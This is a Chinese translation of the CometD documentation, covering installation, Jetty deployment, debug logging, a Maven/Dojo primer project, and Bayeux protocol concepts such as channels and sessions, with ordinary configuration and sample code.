前言
================================
CometD是一个可伸缩的web事件路由总线，它允许您编写低延迟、服务器端、事件驱动的web应用程序。此类应用程序的典型示例是股票交易应用程序、web聊天应用程序、在线游戏和监控控制台。

CometD为您提供了实现这些消息模式的API:包括发布/订阅、点对点(通过服务器)和远程过程调用。这是通过使用一个独立的传输协议(Bayeux协议)实现的，它可以通过HTTP或WebSocket(或其他传输协议)进行传输，这样您的应用程序就不会绑定到特定的传输技术。

CometD可以利用WebSocket(因为它是最高效的web消息传递协议)，而在使用HTTP时使用了被称为Comet的Ajax推送技术模式。

CometD项目提供了Java和JavaScript库，允许您以简单和可移植的方式编写低延迟、服务器端、事件驱动的web应用程序。因此，您可以将精力集中在应用程序的业务方面，而不必担心诸如传输(HTTP或WebSocket)、可伸缩性和健壮性等底层细节。CometD库已经提供了这些的特性。

3.安装
================================
### 3.1.要求与依赖
为了运行CometD应用程序，您需要Java开发工具包(JDK)-version 7.0或更高版本，以及一个兼容的Servlet 3.0或更高的Servlet容器，如Jetty。

CometD的实现依赖于很少的Jetty库，比如Jetty-util-ajax-<version>.jar及其他。这些Jetty依赖通常被打包在应用程序的WEB-INF/lib目录中的.war文件中，不需要部署应用程序。Jetty中的war文件:基于cometd的应用程序将在任何其他兼容的Servlet 3.0或更高的Servlet容器中以同样的方式工作。

当前的Jetty版本CometD依赖默认为:

	<jetty-version>9.2.22.v20170606</jetty-version>
	<!--<jetty-version>9.3.21.v20170918</jetty-version>-->
	<!--<jetty-version>9.4.7.v20170914</jetty-version>-->

从Jetty 9.2.x开始，可以使用不同的Jetty版本来运行CometD 。您可以找到如何使用不同的Jetty版本构建CometD的示例，如何使用不同的Jetty版本运行CometD演示，以及如何使用不同的Jetty版本创建web应用程序。

### 3.2.下载与安装
你可以从[http://download.cometd.org/](http://download.cometd.org/)下载CometD。

然后在您选择的目录中解压CometD:

	$ tar zxvf cometd-<version>-distribution.tgz
	$ cd cometd-<version>/

### 3.3.运行DEMOS
CometD Demos包括：

- 三个完整的聊天应用程序(一个是与Dojo一起开发的，一个是jQuery的，一个是Angular1)；
- 包括：消息确认、重载、timesync和时间戳等的示例；
- 一个如何向特定用户发送私有消息的示例；
- 集群拍卖演示(使用Oort集群)。

##### 3.3.1.使用MAVEN运行DEMOS
如果你想看看CometD演示/或者想尝试您的应用程序，建议以这种模式的运行CometD演示,但它不是推荐的方式来部署一个CometD在生产中的应用。请参阅下一节，了解如何在生产中部署CometD应用程序。

Maven要求您设置JAVA_HOME环境变量以指向您的JDK安装。

在此之后，运行CometD演示非常简单。假设$COMETD是COMETD安装目录，并且在您的PATH中有mvn可执行文件:

	$ cd $COMETD
	$ cd cometd-demo
	$ mvn jetty:run

最后用命令启动嵌入式Jetty来监听8080端口。现在将浏览器指向http://localhost:8080，查看CometD演示主页。

如果您想用不同的Jetty版本运行CometD演示，请将最后一个命令更改为:

	$ mvn jetty:run -Djetty-version=<alternate-jetty-version>

例如：

	$ mvn jetty:run -Djetty-version=9.3.10.v20160621


----------
 - 注意：使用Jetty9.2.x运行CometD要求JDK7版本，使用Jetty9.3.x或更高版本要求至少JDK8.

### 3.4.部署CometD应用程序
当您开发CometD应用程序时，您将开发一个标准的Java EE Web应用程序，然后将其打包成一个war文件。您可以遵循入门部分或CometD教程，以了解如何构建和打包CometD应用程序。

一旦您将CometD应用程序打包为一个war文件，您可以将其部署到任何支持Servlet 3.0或更高版本的Servlet容器中。

请参阅本节以获取进一步的信息，以及有关在Servlet 3.0(或更大)容器上部署的具体说明。

##### 3.4.1.在独立的Jetty中部署CometD应用程序
下面的说明描述了运行CometD应用程序所需的非常小的Jetty设置。有关配置Jetty的详细信息，请参阅官方Jetty文档。

按照以下步骤将CometD应用程序部署到Jetty中。这些指令对于Unix/Linux操作系统是有效的，但是可以很容易地翻译为Windows操作系统。

从Eclipse Jetty下载Jetty发行版。

然后在您选择的目录中解压Jetty发行包，例如/tmp:

	$ cd /tmp
	$ tar zxvf jetty-distribution-<version>.tar.gz
这就创建了一个的名为/tmp/jetty-distribution -<版本>/的目录，它被作为JETTY_HOME。

创建您选择的另一个目录，例如在您的主目录中:

	$ cd ~
	$ mkdir jetty_cometd

这将创建一个名为~/jetty_cometd的目录，该目录作为JETTY_BASE。

由于Jetty是一个高度模块化的Servlet容器，JETTY_BASE配置为您的Jetty目录，其中包含运行CometD应用程序所需的Jetty模块。

为了运行CometD应用程序，Jetty需要配置一些模块:

- http模块，为http协议提供支持。
- websocket模块，为websocket协议提供支持。
- 部署模块，为部署.war文件提供支持 

因此：

	$ cd $JETTY_BASE
	$ java -jar $JETTY_HOME/start.jar --add-to-start=http,websocket,deploy

现在Jetty被配置为运行CometD应用程序，而您只需要部署您的.war文件到Jetty(如果您还没有构建您的应用程序可以使用CometD演示.war文件)：

	$ cp /path/to/cometd_application.war $JETTY_BASE/webapps/

现在可以启动Jetty:

	$ cd $JETTY_BASE
	$ java -jar $JETTY_HOME/start.jar

最后用一个命令启动Jetty，它部署您的.war文件，并激活您的CometD应用程序。

##### 3.4.2.使用嵌入式Jetty部署CometD应用程序
您还可以通过编程方式部署CometD应用程序，使用Jetty api将您的web应用程序嵌入到您将从命令行开始的普通Java应用程序中。

下面你可以找到一个{github}/cometd-demo/src/test/java/org/cometd/demo/Demo.java[示例]展示了如何建立支持HTTP、HTTPS和WebSocket传输的嵌入式Jetty和CometD:

	// Setup and configure the thread pool.
	QueuedThreadPool threadPool = new QueuedThreadPool();
	
	// The Jetty Server instance.
	Server server = new Server(threadPool);
	
	// Setup and configure a connector for clear-text http:// and ws://.
	HttpConfiguration httpConfig = new HttpConfiguration();
	ServerConnector connector = new ServerConnector(server, new HttpConnectionFactory(httpConfig));
	connector.setPort(HTTP_PORT);
	server.addConnector(connector);
	
	// Setup and configure a connector for https:// and wss://.
	SslContextFactory sslContextFactory = new SslContextFactory();
	sslContextFactory.setKeyStorePath("src/test/resources/keystore.jks");
	sslContextFactory.setKeyStorePassword("storepwd");
	sslContextFactory.setKeyManagerPassword("keypwd");
	HttpConfiguration httpsConfig = new HttpConfiguration(httpConfig);
	httpsConfig.addCustomizer(new SecureRequestCustomizer());
	ServerConnector tlsConnector = new ServerConnector(server, sslContextFactory, new HttpConnectionFactory(httpsConfig));
	tlsConnector.setPort(8443);
	server.addConnector(tlsConnector);
	
	// The context where the application is deployed.
	ServletContextHandler context = new ServletContextHandler(server, CONTEXT_PATH);
	
	// Configure WebSocket for the context.
	WebSocketServerContainerInitializer.configureContext(context);
	
	// Setup JMX.
	MBeanContainer mbeanContainer = new MBeanContainer(ManagementFactory.getPlatformMBeanServer());
	server.addBean(mbeanContainer);
	context.setInitParameter(ServletContextHandler.MANAGED_ATTRIBUTES, BayeuxServer.ATTRIBUTE);
	
	// Setup the default servlet to serve static files.
	context.addServlet(DefaultServlet.class, "/");
	
	// Setup the CometD servlet.
	String cometdURLMapping = "/cometd/*";
	ServletHolder cometdServletHolder = new ServletHolder(CometDServlet.class);
	context.addServlet(cometdServletHolder, cometdURLMapping);
	// Required parameter for WebSocket transport configuration.
	cometdServletHolder.setInitParameter("ws.cometdURLMapping", cometdURLMapping);
	// Optional parameter for BayeuxServer configuration.
	cometdServletHolder.setInitParameter("timeout", String.valueOf(15000));
	// Start the CometD servlet eagerly to show up in JMX.
	cometdServletHolder.setInitOrder(1);
	
	// Add your own listeners/filters/servlets here.
	
	server.start();



> 如果您的应用程序需要使用WebSocket客户端连接其他服务，您可能会在启动时获得NoSuchMethodError错误。

> 如果是这样的话，那是因为事实上(Maven格式<groupId>:<artifactId>) org. java:cometd-java-websocket-jetty-client组件依赖于Jetty的混合分类器org.eclipse.jetty.websocket:websocket-client。

> 该组件的混合版本用于部署使用war文件的web应用程序，是用于典型的部署CometD web应用程序。

> 在嵌入式模式中，您不能使用该组件的混合版本，而是应使用常规版本。这通常是通过显式地排除混合版本和显式地包含组件的常规版本来完成的。

> 例如，使用Maven:

	<dependencies>
    ...
    <!-- Explicitly exclude the hybrid dependency. -->
    <dependency>
        <groupId>org.cometd.java</groupId>
        <artifactId>cometd-java-websocket-jetty-client</artifactId>
        <version>${cometd.version}</version>
        <exclusions>
            <exclusion>
                <groupId>org.eclipse.jetty.websocket</groupId>
                <artifactId>websocket-client</artifactId>
            </exclusion>
        </exclusions>
    </dependency>
    <!-- Explicitly include the regular dependency. -->
    <dependency>
        <groupId>org.eclipse.jetty.websocket</groupId>
        <artifactId>websocket-client</artifactId>
        <version>${jetty.version}</version>
    </dependency>
    ...
	</dependencies>

##### 3.4.3.使用另一个Servlet容器运行演示
将CometD应用程序部署到不同的Servlet容器中需要做的是与上面描述的Jetty类似的步骤。

对于您选择的Servlet容器，请参考具体的Servlet容器配置手册，来了解如何部署CometD应用程序.war文件。

4.故障诊断
================================
### 4.1.日志
当CometD不起作用时，您要做的第一件事是启用调试日志记录。这是有帮助的，因为通过阅读调试日志，您可以更好地了解系统中正在发生的事情(并且仅这一点就可以为您提供解决问题所需的答案)，并且CometD开发人员可能需要调试日志来帮助您。

##### 4.1.1.启用JavaScript库中的调试日志
要在JavaScript客户端库中启用调试日志(请参阅JavaScript库部分)，您必须在cometd的配置对象中配置logLevel字段为“debug”值(请参阅JavaScript库配置部分的其他配置选项)：

		cometd.configure({
		    url: 'http://localhost:8080/cometd',
		    logLevel: 'debug'
		});

CometD JavaScript库使用window控制台对象输出日志语句。

一旦您在JavaScript客户端库中启用了日志记录，您就可以在浏览器JavaScript控制台中看到调试日志。例如,在Firefox中您可以通过点击工具→Web开发人员→Web控制台来打开JavaScript控制台,在Chrome可以通过点击工具→开发工具打开JavaScript控制台。

> 注意：Internet Explorer没有和其他浏览器一样定义window控制台对象，导致CometD不能在JavaScript控制台上输出日志，这取决于Internet Explorer版本。

##### 4.1.2.在Java服务器库中启用调试日志记录
CometD Java库(客户机和服务器)都使用SLF4J作为日志框架。Java服务器库使用SLF4J api，但是它不绑定到任何特定的日志实现。您必须选择要使用的实现。默认情况下，SLF4J附带了一个简单的绑定，它不记录在调试级别生成的语句。

因此，您必须使用更高级的绑定(如Log4J或Logback)配置SLF4J。了解如何使用高级绑配置日志请参考SLF4J文档和绑定实现文档。

因此，为您的应用程序启用CometD调试日志，您需要配置您选择使用的任何SLF4J绑定。

一个简单的例子是，对于Log4J，通常可以在WEB-INF/lib中添加SLF4J-Log4J绑定jar 包(slf4j-log4j12-<slf4j-version>.jar)和Log4J jar (Log4J-<Log4J-version>.jar)，然后在web-inf/classes目录下添加一个适当的log4j.properties属性配置文件。您当然不希望手动添加这些文件;这里只是作为一个简单的参考。通常，这些依赖关系配置在您用来创建web应用程序的构建系统中。

一旦您在Java服务器库中启用了日志记录，您就可以在启动了Servlet容器的终端中(或者在其日志文件中，这取决于它的配置方式)看到调试日志。

5.引导
================================
5.1.准备
---------------------
使用CometD API进行项目开发时需要做一些准备，特别是在工具方面，这样可以节省大量的时间。一个重要的工具是Firebug(如果您正在使用Firefox进行开发)，或者Internet Explorer的工具，称为Developer Tools。

CometD项目是使用Maven构建的，使用Maven来构建您的应用程序是一种很合适的方式。这个引子使用Maven作为设置、构建和运行应用程序的基础，但是其他构建工具也可以应用相同的概念。

>注意：windows 用户
>
>如果您在Windows操作系统中工作，请避免使用包含空格的路径，例如“C:\Document And Settings\”，作为您的基本路径。使用“C:\CometD\”这样的基本路径。

5.2.设置项目
---------------------
您可以以两种方式设置项目:使用Maven的方式或非Maven的方式。对于这两种方法，您可以按照设置章节来查看项目的一些文件是如何设置的。

### 5.2.1. Maven 方式

从一个不包含pom.xml的目录中执行以下命令(否则您将得到一个Maven错误)，例如一个空目录：

	$ cd /tmp
	$ mvn org.apache.maven.plugins:maven-archetype-plugin:2.4:generate -DarchetypeCatalog=http://cometd.org
	...
	Choose archetype:
	1: local -> org.cometd.archetypes:cometd-archetype-dojo-jetty9
	2: local -> org.cometd.archetypes:cometd-archetype-spring-dojo-jetty9
	3: local -> org.cometd.archetypes:cometd-archetype-jquery-jetty9
	4: local -> org.cometd.archetypes:cometd-archetype-spring-jquery-jetty9
	Choose a number:

正如您所看到的，有四个archetypes，可以使用Dojo或jQuery JavaScript工具包构建一个框架应用程序，两者都可以选择使用Jetty 9或者和Spring。选择Jetty 9的Dojo，即archetypes number 1。archetypes的生成要求您定义多个属性并为您生成应用程序框架，例如:

	Choose a number: : 1
	Define value for property 'groupId': : org.cometd.primer
	Define value for property 'artifactId': : dojo-jetty9-primer
	Define value for property 'version':  1.0-SNAPSHOT: :
	Define value for property 'package':  org.cometd.primer: :
	[INFO] Using property: cometdVersion = 3.0.0
	[INFO] Using property: jettyVersion = 9.2.0.v20140526
	[INFO] Using property: slf4jVersion = 1.7.7
	Confirm properties configuration:
	groupId: org.cometd.primer
	artifactId: dojo-jetty9-primer
	version: 1.0-SNAPSHOT
	package: org.cometd.primer
	cometdVersion: 3.0.0
	jettyVersion: 9.2.0.v20140526
	slf4jVersion: 1.7.7
	Y: :
	...
	[INFO] BUILD SUCCESS

>注意：现在不要担心用于生成应用程序框架的Jetty版本，因为之后可以很容易地更改它。

然后：

	$ cd dojo-jetty9-primer/

骨架工程存在以下一样的结构：

	$ tree .
	.
	|-- pom.xml
	`-- src
	    `-- main
	        |-- java
	        |   `-- org
	        |       `-- cometd
	        |           `-- primer
	        |               |-- CometDInitializer.java
	        |               `-- HelloService.java
	        `-- webapp
	            |-- application.js
	            |-- index.jsp
	            `-- WEB-INF
	                `-- web.xml

框架项目已经准备好让您使用下面的命令运行:
	
	$ mvn clean install
	$ mvn jetty:run

现在你的浏览器指向http://localhost:8080/dojo-jetty9-primer,您应该看到这个消息:

	CometD Connection Succeeded
	Server Says: Hello, World

就是这样。您已经编写了第一个CometD应用程序:-)

如果您想使用与CometD的默认Jetty版本不同的Jetty版本，可以通过打开主pom.xml文件并修改jetty版本元素的值来轻松实现，例如:

	<project ... >
	
	    ....
	
	    <properties>
	        ...
	        <jetty-version>9.2.17.v20160517</jetty-version>
	        ....
	    </properties>
	
	    ...
	
	</project>

然后您只需如上所述重新构建并重新运行项目。

### 5.2.2.非Maven 方式

第一步是在提供服务的web容器的示例Dojo中配置您喜欢的JavaScript工具包。在使用Maven的方式时，会通过绑定到CometD-javascript-Dojo-<version>.war文件覆盖CometD Dojo来自动获得，但是这里必须手动配置(位于CometD分发版的 CometD-javascript/dojo/target目录中的cometd-javascript-dojo-<version>.war)。

1. 从http://dojotoolkit.org下载Dojo；
2. 解压dojo-release-<version>.tar.gz文件到一个目录，例如/tmp，因此您有一个目录/tmp/dojo-release-<version>，命名为$DOJO；
3. 删除Dojo提供的$DOJO/dojox/cometd.js和$DOJO/dojox/cometd.js.uncompressed.js文件(这些文件都是空的，只是一些您将在稍后放置的文件存根)；
4. 删除Dojo提供的$DOJO/dojox/cometd目录；
5. 复制cometd-javascript-dojo-<version>.war中的dojox/cometd.js文件到$DOJO/；
6. 复制cometd-javascript-dojo-<version>.war中的dojox/cometd目录到$DOJO/。$DOJO/dojox/cometd目录中的内容应该为如下：

		dojox/cometd
		|-- ack.js
		|-- main.js
		|-- reload.js
		|-- timestamp.js
		`-- timesync.js

7. 在$DOJO/中位于dojox目录的同一级别下，从cometd-javascript-dojo-<version>.war中添加org目录及期所有内容；

	最终的内容，相当于Maven的方式，应该是这样的:

		.
		|-- dijit
		|-- dojo
		|-- dojox
		|   |-- cometd
		|   |   |-- ack.js
		|   |   |-- main.js
		|   |   |-- reload.js
		|   |   |-- timestamp.js
		|   |   `-- timesync.js
		|   `-- cometd.js
		|-- org
		|   |-- cometd
		|   |   |-- AckExtension.js
		|   |   |-- ReloadExtension.js
		|   |   |-- TimeStampExtension.js
		|   |   `-- TimeSyncExtension.js
		|   `-- cometd.js
		|-- WEB-INF
		|   |-- classes
		|   |   `-- org
		|   |       `-- cometd
		|   |           `-- primer
		|   |               |-- CometDInitializer.class
		|   |               `-- HelloService.class
		|   |-- lib
		|   |   |-- bayeux-api-<version>.jar
		|   |   |-- cometd-java-common-<version>.jar
		|   |   |-- cometd-java-server-<version>.jar
		|   |   |-- cometd-java-websocket-common-server-<version>.jar
		|   |   |-- cometd-java-websocket-javax-server-<version>.jar
		|   |   |-- jetty-continuation-<version>.jar
		|   |   |-- jetty-http-<version>.jar
		|   |   |-- jetty-io-<version>.jar
		|   |   |-- jetty-jmx-<version>.jar
		|   |   |-- jetty-servlets-<version>.jar
		|   |   |-- jetty-util-<version>.jar
		|   |   |-- jetty-util-ajax-<version>.jar
		|   |   |-- slf4j-api-<version>.jar
		|   |   `-- slf4j-simple-<version>.jar
		|   `-- web.xml
		|-- application.js
		`-- index.jsp

org目录包含CometD实现和扩展，而dojox目录中的对应文件是Dojo绑定。jQuery工具包中存在其他绑定，但是CometD实现是相同的。

第二步是配置服务器端。如果您使用Java，这意味着您必须设置CometD servlet来响应来自客户端的消息。服务器端配置和服务开发的详细信息将在Java服务库部分中解释。

最后一步是编写一个JSP(或HTML)文件，下载JavaScript依赖项和JavaScript应用程序，如下部分所述。

### 5.2.3.设置细节
`index.jsp` JSP文件，包含对JavaScript工具包依赖项和JavaScript应用程序文件的引用:

	<!DOCTYPE html>
	<html>
	  <head>
	    <script data-dojo-config="async: true, deps: ['application.js'], tlmSiblingOfDojo: true"
	            src="${symbol_dollar}{pageContext.request.contextPath}/dojo/dojo.js.uncompressed.js"></script>
	    <script type="text/javascript">
	      var config = {
	        contextPath: '${pageContext.request.contextPath}'
	      };
	    </script>
	  </head>
	<body>
	  ...
	</body>
	</html>

它还配置了JavaScript配置对象:`config`，是JavaScript应用程序可能需要的变量。但这是完全可选的。

JavaScript应用程序中包含的`application.js`文件，配置`cometd`对象并启动应用程序。该archetypes 提供:

	require(['dojo/dom', 'dojo/_base/unload', 'dojox/cometd', 'dojo/domReady!'],
	    function(dom, unloader, cometd) {
	        function _connectionEstablished() {
	            dom.byId('body').innerHTML += '<div>CometD Connection Established</div>';
	        }
	
	        function _connectionBroken() {
	            dom.byId('body').innerHTML += '<div>CometD Connection Broken</div>';
	        }
	
	        function _connectionClosed() {
	            dom.byId('body').innerHTML += '<div>CometD Connection Closed</div>';
	        }
	
	        // Function that manages the connection status with the Bayeux server
	        var _connected = false;
	
	        function _metaConnect(message) {
	            if (cometd.isDisconnected()) {
	                _connected = false;
	                _connectionClosed();
	                return;
	            }
	
	            var wasConnected = _connected;
	            _connected = message.successful === true;
	            if (!wasConnected && _connected) {
	                _connectionEstablished();
	            } else if (wasConnected && !_connected) {
	                _connectionBroken();
	            }
	        }
	
	        // Function invoked when first contacting the server and
	        // when the server has lost the state of this client
	        function _metaHandshake(handshake) {
	            if (handshake.successful === true) {
	                cometd.batch(function() {
	                    cometd.subscribe('/hello', function(message) {
	                        dom.byId('body').innerHTML += '<div>Server Says: ' + message.data.greeting + '</div>';
	                    });
	                    // Publish on a service channel since the message is for the server only
	                    cometd.publish('/service/hello', {name: 'World'});
	                });
	            }
	        }
	
	        // Disconnect when the page unloads
	        unloader.addOnUnload(function() {
	            cometd.disconnect(true);
	        });
	
	        var cometURL = location.protocol + "//" + location.host + config.contextPath + "/cometd";
	        cometd.configure({
	            url: cometURL,
	            logLevel: 'debug'
	        });
	
	        cometd.addListener('/meta/handshake', _metaHandshake);
	        cometd.addListener('/meta/connect', _metaConnect);
	
	        cometd.handshake();
	    });

请注意以下几点:

- 使用`dojo/domReady!`依赖来等待文档在执行`cometd`对象初始化之前的加载。
- 当页面刷新或关闭时，使用`dojo.addOnUnload()`来断开连接。
- 使用函数`_
- Handshake()`来设置与服务器第一次连接时的初始配置(或当服务器丢失客户端信息时，例如由于服务器重启)。这是完全可选的，但强烈推荐，这是推荐的执行订阅的方法。
- 使用函数`_metaConnect()`来检测通信何时成功建立(或重新建立)。这是完全可选的，但强烈推荐。

	请注意，使用`_metaConnect()`和`_connected` 状态变量可以导致您的代码(在这个简单的示例中设置innerHTML属性)被调用不止一次，例如，如果您经历了临时网络故障或服务器重新启动。

	因此，您放入`_connectionEstablished()`函数的代码必须是幂等的。换句话说，确保如果`_connectionEstablished()`函数被调用不止一次，那么它的行为就像只调用一次一样。

6.概念和架构
================================
CometD项目实现了多种Comet技术，以提供可伸缩的web消息系统，该系统可以通过HTTP或其他新兴web协议(如WebSocket)运行。

6.1 定义
----------------------
 客户端初始化连接，服务器接受连接，建立长连接，就是一直打开除非任意一方关闭它

 典型的客户端是浏览器，但是也可以是其他的应用，比如java应用，浏览器插件，或者其他脚本语言。

 根据使用的comet技术不同，一个客户端可能和服务器打开一个或者多个物理连接，但是可以认为在服务器和客户端之间只有一个逻辑的管道

 CometD 工程使用了 Bayeux 协议来交换服务器与客户端之间的信息，通信的单元是一个JSON格式的Bayeux 消息，一个消息包含了几个字段，一些是由Bayeux约定的，其他的可能是应用自己定义添加的。字段是键值对,如消息有foo字段，意味着消息有一个字段，其键是字符串foo。

 客户端和服务器交换的所有的消息都有一个 channel 字段， channel 提供了消息的分类， channel 是 CometD 的核心概念：发布者发送一个消息到 channel，channel的订阅者然后接收到了消息。

 6.1.1.Channel 定义
--------------------------------------
 一个 channnel 是一个看起来像 URL 的字符串,比如 /foo/bar ,/meta/connect ,/service/chat .

Bayeux 标准定义了三种 channel ：mata channels,service channels和broadcast channels。

以 /meta/ 开始的channel 是一个 meta channel，以 /service/ 开始的是 service channel ,其他的都是 broadcast channel.

channel字段是meta channel 的消息就是一个 meta 消息，service 消息和 broadcast 消息也一样。

应用可以任意创建 service channel 和 broadcast channel.

### 6.1.1.1.Meta Channels

Cometd 会创建 meta channels;应用不能创建新的 mata channels ，Meta channels 主要用来和应用交互 Bayeux 协议相关的一些信息，比如，握手有没有成功，或者连接被断开或者重连。

### 6.1.1.2 Service Channels

应用创建 service channels 用来满足服务器和客户端之间 request/response 风格的通信 （和broadcast Channels的 publish/subsribe 的风格相对应）。

### 6.1.1.3 Broadcast Channels

应用也可以创建 broadcase channels,它有消息主题的语义,被用于 publish/subsribe 风格的通讯,比如一个发送者想把消息广播给多个接收者

### 6.1.1.4.Channels中使用通配符

你可以使用通配符匹配多个channels：channel `/foo/*`匹配`/foo/bar`，但不匹配`/foo/bar/baz`，后台使用`/foo/**`来匹配，你可以为任意类型的channel使用通配符：`/meta/*`匹配所有meta channels，`/service/**`匹配所有`/service/bar`，及`/service/bar/baz`。`/**`匹配任何channel。

您仅可以将通配符指定为channel的最后一部分，因此这些是无效的channels:/**/foo或/foo/*/bar。

### 6.1.1.5.通道中使用参数

你可以在channels中使用部分参数：`/foo/{id}`。含有部分参数的Channels称为*template channels*，因为它定义了一个可以匹配到真实channel的模板，来将实际值绑定到模板channel的参数上。模板channel用于在annotated服务，在annotated listeners和annotated subscribers查看他们的用法。例如，`/news/{category}`应用于`/news/sport`channel时，那么`category`会绑定"sport"字符串。

模板channels仅用于channel中段数量一致的情况。例如，`/news/{category}`不会应用在`/news`（段太少），也不会应用在`/news/sport/athletics`（段太多），亦不会应用于`/other/channel`（非参数部分不匹配），而可以在`/news/football`上为`category` 绑定"football"字符串。

一个模板channel不能同时是一个通配符channel，因此`/foo/{id}/*` 或者 `/foo/{var}/**`channel是无效的。

# 6.2 高级抽象

Cometd 实现了 web 消息系统，特别是 publish/subcribe 的场景.

在 publish/subcribe 消息系统里面，发布者发送分好类的消息，订阅者订阅一种或者多种消息，这样他们仅仅接受他们订阅的感兴趣消息，消息的发送者，是不知道他们发送的消息有多少人接收的。

CometD是一个 hub-spoke 拓扑，在默认的配置里，就意味这有一个中心服务器，所有的客户端都连接上面

![](https://i.imgur.com/KvHxw9B.png)


在 CometD 里面，服务器接受发布者的消息，如果消息的channel 是 broadcast 的话，则将消息转发给感兴趣的订阅者。CometD以一种特殊的方式处理meta messages和service messages；它不会将它们重新路由到任何订阅者（默认情况下，禁止订阅元通道，而订阅服务通道是不允许操作的）。

例如，假设`clientAB`订阅了channels `/A`和`/B`，而`clientB`订阅了channel `/B`。如果发布者在channel`/a`上发布消息，则只有`clientAB`接收它。换句话说，如果发布者在channel`/B`上发布消息，则`clientAB`和`clientB`都可接收到消息。此外，如果发布者在channel`/C`上发布消息，那么`clientAB`和`clientB`都不会接收到消息，然后结束它在服务器上的旅程。重新路由broadcast messages是服务器的默认行为，它不需要任何应用程序代码来执行重新路由。

抽象来看，您可以看到消息是通过conduits（管道）在客户端和服务器之间来回流动。单个broadcast messages可能到达服务器并重新路由到所有客户端;您可以想象当它到达服务器时，消息被复制，并将副本发送给每个客户端(尽管出于效率的原因，这并不是实际发生的情况)。如果发送者也订阅它发布消息的channel，它也将收到消息的副本。

# 6.3. 具体定义

接下来的章节将更进一步的研究CometD是如何工作的。

现在我们清楚地知道CometD的核心是一个通过Bayeux协议进行交互的client/server 系统。

在CometD的实现中，使用half-object plus protocol模式捕获取client/server的通信：当客户端half-object对象建立了一个与服务端的通信管道后，相应的服务端的half-object也被创建，它们两个就可以进行通信了。CometD使用了这种模式的变种，因为需要对传输消息进行传输的抽象。这种传输是基于Http协议的，当然在最近的CometD版本中也可以基于WebSocket协议（你也可以插入更多的协议）。

广义上讲，*client*是由client half-object和client transport组成的，而*server*则是更复杂的实体组合，包括server half-objects和server transports。

6.3.1 会话Sessions
------------------

会话在CometD中是一个核心概念。它们是通信协议中所涉及的half-objects的表现。

![](https://i.imgur.com/01LbfpU.png)


有三种会话：

- *Clinet sessions*客户端会话－是客户端的client half-object。 客户端会话在JavaScript中是由`org.cometd.CometD`对象表示的，在JAVA中是由`org.cometd.bayeux.client.ClientSession`类表示（其实更多的是由它的子类`org.cometd.bayeux.client.BayeuxClient`表示）。客户端创建一个client session来与服务端建立起Bayeux通信，这样客户端就可以发布和接收消息了。
- *Server sessions*服务端会话－是服务端的server half-object。服务端会话在服务端是由`org.cometd.bayeux.server.ServerSession`类表示的；它们与客户端会话是一一匹配的。当一个客户端创建了一个client session后，它最初不会关联一个对应的server session。仅当client session与服务端建立了Bayeux通信后，服务端才创建它相应的server session，以及两个half-objects的连接。每个server session有一个消息队列（message queue）。消息被发布到一个channel后，必须要投递到订阅了该channel的远程client sessions。消息首先进入server session的消息队列，然后投递到相应的client session。
- *Local sessions*本地会话－是处于服务端的client half-object，由`org.cometd.bayeux.server.LocalSession`类表示。本地会话可以被认为是生存于服务端的客户。他们不代表远程客户端，而是一个server-side client（服务端客户）。本地会话可以订阅channel，并像client session一样发布消息。服务端只认识服务端会话，而创建服务端会话唯一的方式是首先要创建相应的客户端会话，然后与服务端建立起Bayeux通信。出于这个原因，在服务端便有了额外的本地会话的概念。local session是生存于服务端的client session，因此它是服务端本地会话。例如，假设一个远程客户端每当状态有变化时发送一条消息。其它远程客户端订阅了该channel，并接收那些状态更新消息。但是，如果在接收到远程客户端状态更新后，你想要在服务端执行一些动作怎么办呢？那么你需要一个存在于服务端的等价的远程客户端，这就是local session。

服务端的各服务通过一个local session来关联。在创建服务端的服务时，local session 与之握手并创建相应的server sesion half-object，因而服务端对同样的方式对待客户端会话与本地会话。服务端将消息发送给所有订阅了该channel的服务端会话，无论他们是来自远程客户端会话还是本地会话。

有关更多的服务信息，请查看服务章节

6.3.2. Server服务
-----------------
*server*使用`org.cometd.bayeux.server.BayeuxServer`来表示。BayeuxServer对象作用包括：

- server sessions的Repository，参见会话章节
- server transports的Repository－用`org.cometd.bayeux.server.ServerTransport`类来表示。server transport是一个服务端的组件，用于处理与客户端通信的细节。包话HTTP server transports，WebSocket server transport，你也可以添加其他类型的。Server transports抽象了通信细节，应用只要知道Bayeux消息即可，而无需关心他们是如何到达服务端的。
- server channels的Repository－ 使用`org.cometd.bayeux.server.ServerChannel`类表示。server channel是channel在服务端的表示；它可以接收和发布Bayeux消息。
- *extensions*的Repository－使用`org.cometd.bayeux.server.BayeuxServer.Extension`类表示。Extensions扩展允许应用程序使用Bayeux协议进行交互，如修改，删除或重载Bayeux消息。extensions的更多信息请参阅extensions章节。
- 授权认证中心，通过一个安全策略实例－`org.cometd.bayeux.server.SecurityPolicy`类来表示。CometD询问安全策略以授权任何服务端的敏感操作。例如
- ，创建channel，订阅channel，发布channel。应用程序可以提供他们自己的安全策略，以实现它们自己的授权逻辑。有关安策略更多的信息，请参阅authorization授权章节。
- 授权者－使用`org.cometd.bayeux.server.SecurityPolicy`类表示，允许你应用更细粒度的授权策略。进一步的授权者信息，参阅authorizers章节。
- 消息处理器，用于协调服务端传输、扩展、安全策略的工作，以及实现消息流算法(参见消息处理部分)，允许应用程序与消息和通道交互以实现其应用程序逻辑。

6.3.3. Listeners监听器
---------------------
应用程序使用监听器与session、channel、及server进行交互。在Java与JavaScript的API中，允许应用程序注册各种监听器来接收相应事件的通知。您可以将扩展、安全策略和授权程序看作特殊类型的监听器。以后的章节我们也将这样看待。

### 6.3.3.1. Client Sessions and Listeners

客户端会话监听器的作用包括：

- 通过`ClientSession.addExtension(ClientSession.Extension)`接口你可以为client session添加extension，用于session发送和到达的出入消息进行交互。
- 一个client session就是一个channel的repository；你可以通过`ClientSession.getChannel(String).addListener(ClientSessionChannel.MessageListener)`接口给一个channel添加消息监听器，以当消息到达特定的channel时来通知你。

### 6.3.3.2. Servers and Listeners

在服务端，模式类似，但更丰富。

- 你可以通过`BayeuxServer.addExtension(BayeuxServer.Extension)`接口为所有流经服务端的消息的`BayeuxServer`实例添加extension。
- `BayeuxServer`允许你通过`BayeuxServer.addListener(BayeuxServer.ChannelListener)`接口添加接收创建或销毁channel通知的监听器，通过`BayeuxServer.addListener(BayeuxServer.SessionListener)`接口添加接收创建或销毁server session通知的监听器。
